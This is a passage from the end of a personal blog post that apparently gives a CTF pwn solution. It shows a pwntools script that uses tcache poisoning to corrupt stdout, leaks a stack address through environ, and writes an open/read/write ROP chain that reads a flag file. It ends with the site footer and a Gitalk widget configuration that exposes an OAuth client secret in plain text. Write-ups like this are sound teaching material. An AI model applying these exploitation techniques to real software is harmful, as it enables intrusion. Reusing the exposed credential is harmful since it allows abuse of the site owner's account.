class="string">&#x27;_IO_2_1_stdout_&#x27;</span>]</span><br><span class="line"></span><br><span class="line">delete(<span class="number">7</span>)</span><br><span class="line">add(<span class="number">0x90</span>,<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">delete(<span class="number">8</span>)</span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">add(<span class="number">0x80</span>,p64(<span class="number">0</span>) + p64(<span class="number">0xa1</span>) + p64(stdout))</span><br><span class="line">add(<span class="number">0x90</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">add(<span class="number">0x90</span>, p64(<span class="number">0xfbad1800</span>) + p64(<span class="number">0</span>) * <span class="number">3</span> + p64(environ) + p64(environ + <span class="number">8</span>) * <span class="number">2</span>)</span><br><span class="line">stack = l64() - <span class="number">0x128</span></span><br><span class="line">inf(stack)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">0x80</span>,p64(<span class="number">0</span>) + p64(<span class="number">0xa1</span>) + p64(stack))</span><br><span class="line">add(<span class="number">0x90</span>,<span class="string">&#x27;b&#x27;</span>)</span><br><span class="line"></span><br><span class="line">open_ = libc_base + libc.sym[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">read_ = libc_base + libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">write_ = libc_base + libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line"><span class="comment"># inf(open_);inf(read_);inf(write_)</span></span><br><span class="line">pop_rdi = libc_base + <span class="number">0x0000000000023b6a</span></span><br><span class="line">pop_rsi = libc_base + <span class="number">0x000000000002601f</span></span><br><span class="line">pop_rdx = libc_base + <span class="number">0x0000000000142c92</span></span><br><span class="line">flag = stack</span><br><span class="line">addr = stack + <span class="number">0x100</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;./flag\x00\x00&#x27;</span></span><br><span class="line">payload += p64(pop_rdi) + p64(flag) + p64(pop_rsi) + p64(<span class="number">0</span>) +p64(open_) \</span><br><span class="line"> + p64(pop_rdi) + p64(<span class="number">3</span>) + p64(pop_rsi) + p64(addr) +p64(pop_rdx) + p64(<span class="number">0x30</span>) + p64(read_) \</span><br><span class="line"> + p64(pop_rdi) + p64(<span class="number">1</span>) + p64(write_)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x90</span>,payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(io,&#x27;b *$rebase(0x004080)&#x27;)</span></span><br><span class="line">ia()</span><br></pre></td></tr></table></figure>


        </div>

        
            <section class="post-copyright">
                
                
                    <p class="copyright-item">
                        <span>Permalink:</span>
                        <span><a href="http://ld1ng.top/2022/12/14/Match22/">http://ld1ng.top/2022/12/14/Match22/</a></span>
                    </p>
                
                
                    <p class="copyright-item">
                        <span>License:</span>
                        <span>Copyright (c) <a target="_blank" rel="noopener" href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
                    </p>
                
                

            </section>
        
        <section class="post-nav">
            
                <a class="prev" rel="prev" href="/2022/12/16/DST_Server/">DST联机版 服务器搭建</a>
            
            
            <a class="next" rel="next" href="/2022/01/07/CVE-2018-1160/">关于NETATALK的一个老BUG</a>
            
        </section>

    <div id="gitalk-container"></div>
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1.7.2/dist/gitalk.css">
<script src="https://cdn.jsdelivr.net/npm/gitalk@1.7.2/dist/gitalk.min.js"></script>
<script src="//cdn.bootcss.com/blueimp-md5/2.10.0/js/md5.js"></script>
<div id="gitalk-container"></div>
<script type="text/javascript">
      var gitalk = new Gitalk({
        clientID: '458a98372426d92cae5a',
        clientSecret: '91e874ad339e3ffbd20d52f4d247739c8e722a72',
        repo: 'ld1ng.github.io',
        owner: 'Ld1ng',
        admin: 'Ld1ng',
        id: md5(location.pathname),
        labels: 'Gitalk'.split(',').filter(l => l),
        perPage: 10,
        pagerDirection: 'last',
        createIssueManually: true,
        distractionFreeMode: false
      })
      gitalk.render('gitalk-container')
</script>


    </article>
</div>
            </div>
            <footer id="footer" class="footer">
    <div class="copyright">
        <span>Ld1ng🍕 © 2020 - 2023 │ Powered by <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
    </div>
</footer>

    </div>
</body>

</html>